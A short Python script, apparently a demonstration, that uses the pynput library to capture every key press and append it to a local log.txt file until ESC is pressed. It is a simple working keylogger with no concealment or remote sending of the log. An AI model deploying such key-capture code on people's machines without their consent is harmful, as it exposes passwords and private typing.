from pynput.keyboard import Key, Listener
import os

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    if key == Key.esc:
        return False  # Stop logger on ESC

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
